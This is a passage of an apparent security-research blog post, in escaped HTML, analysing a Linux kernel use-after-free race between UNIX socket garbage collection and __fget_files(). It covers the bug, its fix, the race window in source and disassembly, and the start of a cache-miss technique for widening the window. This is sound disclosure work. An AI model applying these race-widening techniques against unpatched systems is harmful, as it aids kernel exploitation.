that&amp;#39;s the part I was curious about.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c6\"&gt;This also demonstrates that even very small race conditions can still be exploitable if someone sinks enough time into writing an exploit, so be careful if you dismiss very small race windows as unexploitable or don&amp;#39;t treat such issues as security bugs.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;The UAF reproducer is &lt;/span&gt;&lt;span class=\"c11\"&gt;&lt;a class=\"c121\" href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=2247#c6\"&gt;in our bugtracker&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c1\"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"c15\" id=\"h.qtcj62oowcyh\"&gt;&lt;span class=\"c8\"&gt;The bug&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;In the UNIX domain socket garbage collection code (which is needed to deal with reference loops formed by UNIX&lt;/span&gt;&lt;span&gt;&amp;nbsp;domain sockets&lt;/span&gt;&lt;span&gt;&amp;nbsp;that use &lt;/span&gt;&lt;span class=\"c4\"&gt;SCM_RIGHTS&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;file descriptor passing), the kernel tries to figure out whether it can account for all references to some file by comparing the file&amp;#39;s refcount with the number of references from inflight SKBs (socket buffers). If they are equal, it assumes that the UNIX domain sockets subsystem effectively has exclusive access to the file because it owns all references.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;(The same pattern also appears for files as an optimization in &lt;/span&gt;&lt;span class=\"c4\"&gt;__fdget_pos()&lt;/span&gt;&lt;span&gt;, see &lt;/span&gt;&lt;span class=\"c11\"&gt;&lt;a class=\"c121\" href=\"https://lore.kernel.org/lkml/CAG48ez1pnatAB095dnbrn9LbuQe4+ENwh-WEW36pM40ozhpruw@mail.gmail.com/\"&gt;this LKML thread&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c1\"&gt;.)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;The problem is that &lt;/span&gt;&lt;span class=\"c4\"&gt;struct file&lt;/span&gt;&lt;span&gt;&amp;nbsp;can also be referenced from an RCU read-side critical section (which you can&amp;#39;t detect by looking at the refcount), and such an RCU reference can be upgraded into a refcounted reference using &lt;/span&gt;&lt;span class=\"c4\"&gt;get_file_rcu()&lt;/span&gt;&lt;span&gt;&amp;nbsp;/ &lt;/span&gt;&lt;span class=\"c4\"&gt;get_file_rcu_many()&lt;/span&gt;&lt;span&gt;&amp;nbsp;by &lt;/span&gt;&lt;span class=\"c4\"&gt;__fget_files()&lt;/span&gt;&lt;span&gt;&amp;nbsp;as long as the refcount is non-zero. For example, when this happens in the &lt;/span&gt;&lt;span class=\"c4\"&gt;dup()&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;syscall, the resulting reference will then be installed in the FD table and be available for subsequent syscalls.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;When the garbage collector (GC) believes that it has exclusive access to a file, it will perform operations on that file that violate the locking rules used in normal socket-related syscalls such as &lt;/span&gt;&lt;span class=\"c4\"&gt;recvmsg()&lt;/span&gt;&lt;span&gt;&amp;nbsp;- &lt;/span&gt;&lt;span class=\"c4\"&gt;unix_stream_read_generic()&lt;/span&gt;&lt;span&gt;&amp;nbsp;assumes that queued SKBs can only be removed under the &lt;/span&gt;&lt;span class=\"c4\"&gt;-&amp;gt;iolock&lt;/span&gt;&lt;span&gt;&amp;nbsp;mutex, but the GC removes queued SKBs without using that mutex. (Thanks to Xingyu Jin for explaining that to me.)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;One way of looking at this bug is that the GC is working correctly - here&amp;#39;s a state diagram showing some of the possible states of a &lt;/span&gt;&lt;span class=\"c4\"&gt;struct file&lt;/span&gt;&lt;span class=\"c1\"&gt;, with more specific states nested under less specific ones and with the state transition in the GC marked:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;/p&gt;\n  \n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKajtxfGAZhXanWS7kcvJozqQU2jozVQGIZdgex6_IRhp9jWHiJiL2KQddxH7Ma02d5sqhnXROh1PacqksZu3sA7-zjwh3ES8E8fQ7Jza8lu2claui1T9xYN3wrgv4J9yMFxbrUIAGiouvy4GGq-J69qROIjIITzvNpMQtJpljanHvTgd4xgrhZfRt/s641/image19.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKajtxfGAZhXanWS7kcvJozqQU2jozVQGIZdgex6_IRhp9jWHiJiL2KQddxH7Ma02d5sqhnXROh1PacqksZu3sA7-zjwh3ES8E8fQ7Jza8lu2claui1T9xYN3wrgv4J9yMFxbrUIAGiouvy4GGq-J69qROIjIITzvNpMQtJpljanHvTgd4xgrhZfRt/s641/image19.png\" border=\"0\" alt=\"All relevant states are RCU-accessible. An RCU-accessible object can have either a zero refcount or a positive refcount. Objects with a positive refcount can be either live or owned by the garbage collector. When the GC attempts to grab a file, it transitions from the state &amp;quot;live&amp;quot; to the state &amp;quot;owned by GC&amp;quot; by getting exclusive ownership of all references to the file.\" style=\"max-height: 750; max-width: 600px;\"title=\"All relevant states are RCU-accessible. An RCU-accessible object can have either a zero refcount or a positive refcount. Objects with a positive refcount can be either live or owned by the garbage collector. When the GC attempts to grab a file, it transitions from the state &amp;quot;live&amp;quot; to the state &amp;quot;owned by GC&amp;quot; by getting exclusive ownership of all references to the file.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;While &lt;/span&gt;&lt;span class=\"c4\"&gt;__fget_files()&lt;/span&gt;&lt;span&gt;&amp;nbsp;is making an incorrect assumption about the state of the &lt;/span&gt;&lt;span class=\"c4\"&gt;struct file&lt;/span&gt;&lt;span&gt;&amp;nbsp;while it is trying to narrow down its possible states - it checks whether &lt;/span&gt;&lt;span class=\"c4\"&gt;get_file_rcu()&lt;/span&gt;&lt;span&gt;&amp;nbsp;/ &lt;/span&gt;&lt;span class=\"c4\"&gt;get_file_rcu_many()&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;succeeds, which narrows the file&amp;#39;s state down a bit but not far enough:&lt;/span&gt;&lt;/p&gt;\n  &lt;p class=\"c3\"&gt;&lt;/p&gt;\n  \n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgab4PkrLpvTF9E3D-nw5dSk35gvYRa--cQy0Oi60WjpbOjZbKE5zKNWa5ZEsuI-q7-UVZJrJD4Au-gTBF0p1VJSQ9gY75yIYL72zENk2Nt9RSQXBeJrIjtueSKK3xi3QN3a7dSAKXf-6JAL0RZXrnpCh3CdcC_QAyZK-hbbqXesvQQWlys0V-N3PE7/s638/image10%281%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgab4PkrLpvTF9E3D-nw5dSk35gvYRa--cQy0Oi60WjpbOjZbKE5zKNWa5ZEsuI-q7-UVZJrJD4Au-gTBF0p1VJSQ9gY75yIYL72zENk2Nt9RSQXBeJrIjtueSKK3xi3QN3a7dSAKXf-6JAL0RZXrnpCh3CdcC_QAyZK-hbbqXesvQQWlys0V-N3PE7/s638/image10%281%29.png\" border=\"0\" alt=\"__fget_files() first uses get_file_rcu() to conditionally narrow the state of a file from &amp;quot;any RCU-accessible state&amp;quot; to &amp;quot;any refcounted state&amp;quot;. Then it has to narrow the state from &amp;quot;any refcounted state&amp;quot; to &amp;quot;live&amp;quot;, but instead it just assumes that they are equivalent.\" style=\"max-height: 750; max-width: 600px;\"title=\"__fget_files() first uses get_file_rcu() to conditionally narrow the state of a file from &amp;quot;any RCU-accessible state&amp;quot; to &amp;quot;any refcounted state&amp;quot;. Then it has to narrow the state from &amp;quot;any refcounted state&amp;quot; to &amp;quot;live&amp;quot;, but instead it just assumes that they are equivalent.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;And this directly leads to how &lt;/span&gt;&lt;span class=\"c11\"&gt;&lt;a class=\"c121\" href=\"https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=054aa8d439b9185d4f5eb9a90282d1ce74772969\"&gt;the bug was fixed&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;(there&amp;#39;s &lt;/span&gt;&lt;span class=\"c11\"&gt;&lt;a class=\"c121\" href=\"https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=e386dfc56f837da66d00a078e5314bc8382fab83\"&gt;another follow-up patch&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, but that one just tries to clarify the code and recoup some of the resulting performance loss) - the fix adds another check in &lt;/span&gt;&lt;span class=\"c4\"&gt;__fget_files()&lt;/span&gt;&lt;span&gt;&amp;nbsp;to properly narrow down the state of the file such that the file is guaranteed to be live&lt;/span&gt;&lt;span class=\"c1\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEit6FDn3u3QdHshSHrZY09kFv_HtKUA7KlZZNKLc9t8Tx3uGJsC14qcx_IU691a14IUOH-OgfDjGpRLGh4Cwx4nlBfap1fCVOzT5PuOQXVv6e1-t79J46UO-uuUL_s6QzABu8JkrnEtyKV68GovV_o8Yem6E8Y9sl23usVNoXnoJ5xOhPZFVsconARG/s638/image16.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEit6FDn3u3QdHshSHrZY09kFv_HtKUA7KlZZNKLc9t8Tx3uGJsC14qcx_IU691a14IUOH-OgfDjGpRLGh4Cwx4nlBfap1fCVOzT5PuOQXVv6e1-t79J46UO-uuUL_s6QzABu8JkrnEtyKV68GovV_o8Yem6E8Y9sl23usVNoXnoJ5xOhPZFVsconARG/s638/image16.png\" border=\"0\" alt=\"The fix is to properly narrow the state from &amp;quot;any refcounted state&amp;quot; to &amp;quot;live&amp;quot; by checking whether the file is still referenced by a file descriptor table entry.\" style=\"max-height: 750; max-width: 600px;\"title=\"The fix is to properly narrow the state from &amp;quot;any refcounted state&amp;quot; to &amp;quot;live&amp;quot; by checking whether the file is still referenced by a file descriptor table entry.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;The fix ensures that a live reference can only be derived from another live reference by comparing with an FD table entry, which is guaranteed to point to a live object.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c16\"&gt;[Sidenote: This scheme is similar to the one used for &lt;/span&gt;&lt;span class=\"c4 c16\"&gt;struct page&lt;/span&gt;&lt;span class=\"c16\"&gt;&amp;nbsp;- &lt;/span&gt;&lt;span class=\"c4 c16\"&gt;gup_pte_range()&lt;/span&gt;&lt;span class=\"c16\"&gt;&amp;nbsp;also uses the &amp;quot;grab pointer, increment refcount, recheck pointer&amp;quot; pattern for locklessly looking up a &lt;/span&gt;&lt;span class=\"c4 c16\"&gt;struct page&lt;/span&gt;&lt;span class=\"c16\"&gt;&amp;nbsp;from a page table entry while ensuring that new refcounted references can&amp;#39;t be created without holding an existing reference. This is really important for &lt;/span&gt;&lt;span class=\"c4 c16\"&gt;struct page&lt;/span&gt;&lt;span class=\"c16\"&gt;&amp;nbsp;because a page can be given back to the page allocator and reused while &lt;/span&gt;&lt;span class=\"c4 c16\"&gt;gup_pte_range()&lt;/span&gt;&lt;span class=\"c16\"&gt;&amp;nbsp;holds an uncounted reference to it - freed pages still have their &lt;/span&gt;&lt;span class=\"c4 c16\"&gt;struct page&lt;/span&gt;&lt;span class=\"c13\"&gt;, so there&amp;#39;s no need to delay freeing of the page - so if this went wrong, you&amp;#39;d get a page UAF.]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;My initial suggestion was to instead fix the issue by changing how &lt;/span&gt;&lt;span class=\"c4\"&gt;unix_gc()&lt;/span&gt;&lt;span&gt;&amp;nbsp;ensures that it has exclusive access, letting it set the file&amp;#39;s refcount to zero to prevent turning RCU references into refcounted ones; this would have avoided adding any code in the hot &lt;/span&gt;&lt;span class=\"c4\"&gt;__fget_files()&lt;/span&gt;&lt;span&gt;&amp;nbsp;path, but it would have only fixed &lt;/span&gt;&lt;span class=\"c4\"&gt;unix_gc()&lt;/span&gt;&lt;span&gt;, not the &lt;/span&gt;&lt;span class=\"c4\"&gt;__fdget_pos()&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;case I discovered later, so it&amp;#39;s probably a good thing this isn&amp;#39;t how it was fixed:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;/p&gt;\n  \n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj1Eob19v9RoctxBGUR4nmMSrJQJXvw-WjVihOxiudjG3ssu5WfL-YRXj_Gd99CifW1GplS3Yhwlc2WIc0-nPSOecYylZouk0zco24SgxUyyaFDps2wck4jVhWCcSbU7l3cFKB-hk4q3EOwwFJIgFKFSNnW9DgprGIMo5EKTMCt7SFnNdofQ9LnCjQu/s641/image5%283%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj1Eob19v9RoctxBGUR4nmMSrJQJXvw-WjVihOxiudjG3ssu5WfL-YRXj_Gd99CifW1GplS3Yhwlc2WIc0-nPSOecYylZouk0zco24SgxUyyaFDps2wck4jVhWCcSbU7l3cFKB-hk4q3EOwwFJIgFKFSNnW9DgprGIMo5EKTMCt7SFnNdofQ9LnCjQu/s641/image5%283%29.png\" border=\"0\" alt=\"\" style=\"max-height: 750; max-width: 600px;\"title=\"\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c16\"&gt;[Sidenote: In my original bug report I wrote that you&amp;#39;d have to wait an RCU grace period in the GC for this, but that wouldn&amp;#39;t be necessary as long as the GC ensures that a reaped socket&amp;#39;s refcount never becomes non-zero again.]&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"c15\" id=\"h.60irov9pzlh\"&gt;&lt;span class=\"c8\"&gt;The race&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;There are multiple race conditions involved in exploiting this bug, but by far the trickiest to hit is that we have to race an operation into the tiny race window in the middle of &lt;/span&gt;&lt;span class=\"c4\"&gt;__fget_files()&lt;/span&gt;&lt;span&gt;&amp;nbsp;(which can e.g. be reached via &lt;/span&gt;&lt;span class=\"c4\"&gt;dup()&lt;/span&gt;&lt;span class=\"c1\"&gt;), between the file descriptor table lookup and the refcount increment:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;static struct file *__fget_files(struct files_struct *files, unsigned int fd,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;fmode_t mask, unsigned int refs)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; struct file *file;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; rcu_read_lock();&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;loop:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c4 c9\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; file = &lt;/span&gt;&lt;span class=\"c6 c18 c9\"&gt;files_lookup_fd_rcu(files, fd)&lt;/span&gt;&lt;span class=\"c4 c9\"&gt;; &lt;/span&gt;&lt;span class=\"c5\"&gt;// race window start&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; if (file) {&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; /* File object ref couldn&amp;#39;t be taken.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* dup2() atomicity guarantee is the reason&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* we loop to catch the new file (or NULL pointer)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; if (file-&amp;gt;f_mode &amp;amp; mask)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; file = NULL;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c4 c9\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; else if (!&lt;/span&gt;&lt;span class=\"c6 c9 c18\"&gt;get_file_rcu_many(file, refs)&lt;/span&gt;&lt;span class=\"c4 c9\"&gt;) &lt;/span&gt;&lt;span class=\"c5\"&gt;// race window end&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; goto loop;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; rcu_read_unlock();&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; return file;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;In this race window&lt;/span&gt;&lt;span&gt;, th&lt;/span&gt;&lt;span&gt;e file descriptor must be closed (to drop the FD&amp;#39;s reference to the file) and a &lt;/span&gt;&lt;span class=\"c4\"&gt;unix_gc()&lt;/span&gt;&lt;span&gt;&amp;nbsp;run must get past the point where it checks the file&amp;#39;s refcount (&amp;quot;&lt;/span&gt;&lt;span class=\"c4 c24\"&gt;total_refs = file_count(u-&amp;gt;sk.sk_socket-&amp;gt;file)&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;quot;).&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;In the Debian 5.10.0-9-amd64 kernel at version 5.10.70-1, that race window looks as follows:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;lt;__fget_files+0x1e&amp;gt; cmp &amp;nbsp; &amp;nbsp;r10,rax&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;lt;__fget_files+0x21&amp;gt; sbb &amp;nbsp; &amp;nbsp;rax,rax&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;lt;__fget_files+0x24&amp;gt; mov &amp;nbsp; &amp;nbsp;rdx,QWORD PTR [r11+0x8]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;lt;__fget_files+0x28&amp;gt; and &amp;nbsp; &amp;nbsp;eax,r8d&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;lt;__fget_files+0x2b&amp;gt; lea &amp;nbsp; &amp;nbsp;rax,[rdx+rax*8]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c4 c9\"&gt;&amp;lt;__fget_files+0x2f&amp;gt; mov &amp;nbsp; &amp;nbsp;r12,QWORD PTR [rax] &lt;/span&gt;&lt;span class=\"c22 c6 c18 c9\"&gt;; RACE WINDOW START&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c22 c6 c18 c9\"&gt;; r12 now contains file*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;lt;__fget_files+0x32&amp;gt; test &amp;nbsp; r12,r12&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;lt;__fget_files+0x35&amp;gt; je &amp;nbsp; &amp;nbsp; ffffffff812e3df7 &amp;lt;__fget_files+0x77&amp;gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;lt;__fget_files+0x37&amp;gt; mov &amp;nbsp; &amp;nbsp;eax,r9d&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c4 c9\"&gt;&amp;lt;__fget_files+0x3a&amp;gt; and &amp;nbsp; &amp;nbsp;eax,DWORD PTR [r12+0x44] &lt;/span&gt;&lt;span class=\"c6 c18 c9 c22\"&gt;; LOAD (for -&amp;gt;f_mode)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;lt;__fget_files+0x3f&amp;gt; jne &amp;nbsp; &amp;nbsp;ffffffff812e3df7 &amp;lt;__fget_files+0x77&amp;gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c4 c9\"&gt;&amp;lt;__fget_files+0x41&amp;gt; mov &amp;nbsp; &amp;nbsp;rax,QWORD PTR [r12+0x38] &lt;/span&gt;&lt;span class=\"c22 c6 c18 c9\"&gt;; LOAD (for -&amp;gt;f_count)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;lt;__fget_files+0x46&amp;gt; lea &amp;nbsp; &amp;nbsp;rdx,[r12+0x38]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;lt;__fget_files+0x4b&amp;gt; test &amp;nbsp; rax,rax&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;lt;__fget_files+0x4e&amp;gt; je &amp;nbsp; &amp;nbsp; ffffffff812e3def &amp;lt;__fget_files+0x6f&amp;gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c2\"&gt;&amp;lt;__fget_files+0x50&amp;gt; lea &amp;nbsp; &amp;nbsp;rcx,[rsi+rax*1]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c4 c9\"&gt;&amp;lt;__fget_files+0x54&amp;gt; lock cmpxchg QWORD PTR [rdx],rcx &lt;/span&gt;&lt;span class=\"c6 c18 c9\"&gt;; RACE WINDOW END (on cmpxchg success)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;As you can see, the race window is fairly small - around 12 instructions, assuming that the &lt;/span&gt;&lt;span class=\"c4\"&gt;cmpxchg&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;succeeds.&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"c15\" id=\"h.dhdzjamcop53\"&gt;&lt;span class=\"c8\"&gt;Missing some cache&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;Luckily for us, the race window contains the first few memory accesses to the &lt;/span&gt;&lt;span class=\"c4\"&gt;struct file&lt;/span&gt;&lt;span&gt;; therefore, by making sure that the &lt;/span&gt;&lt;span class=\"c4\"&gt;struct file&lt;/span&gt;&lt;span&gt;&amp;nbsp;is not present in the fastest CPU caches, we can widen the race window by as much time as the memory accesses take. The standard way to do this is to use &lt;/span&gt;&lt;span&gt;an eviction pattern&lt;/span&gt;&lt;span&gt;&amp;nbsp;/ &lt;/span&gt;&lt;span class=\"c11\"&gt;&lt;a class=\"c121\" href=\"https://www.cs.columbia.edu/~simha/spyjs.ccs15.pdf\"&gt;eviction set&lt;/a&gt;&lt;/span&gt;&lt;span&gt;; but instead we can also make the cache line dirty on another core (see &lt;/span&gt;&lt;span class=\"c11\"&gt;&lt;a class=\"c121\" href=\"https://dreamsofastone.blogspot.com/2016/02/row-hammer-java-script-and-mesi.html\"&gt;Anders Fogh&amp;#39;s blogpost&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;for more detail). (I&amp;#39;m not actually sure about the intricacies of how much latency this adds on different manufacturers&amp;#39; CPU cores, or on different CPU generations - I&amp;#39;ve only tested different versions of my proof-of-concept on Intel Skylake and Tiger Lake. Differences in cache &lt;/span&gt;&lt;span&gt;coherency&lt;/span&gt;&lt;span 